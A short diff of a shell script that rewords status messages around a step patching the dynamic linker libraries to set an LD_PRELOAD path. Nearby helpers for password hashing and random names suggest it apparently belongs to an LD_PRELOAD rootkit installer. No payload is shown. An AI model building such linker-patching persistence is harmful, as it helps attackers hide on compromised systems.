@@ -73,8 +73,9 @@ crypt_password(){ # if we can use python3, use it. if not, use openssl.
 }
 
 patch_libdl(){
-    necho "Patching dynamic linker libraries"
+    necho "Patching dynamic linker libraries, please wait..."
     LDSO_PRELOAD="`etc/patch_libdl.sh -op | tail -n 1`"
+    secho "Finished patching dynamic linker"
 }
 
 get_rand_name(){
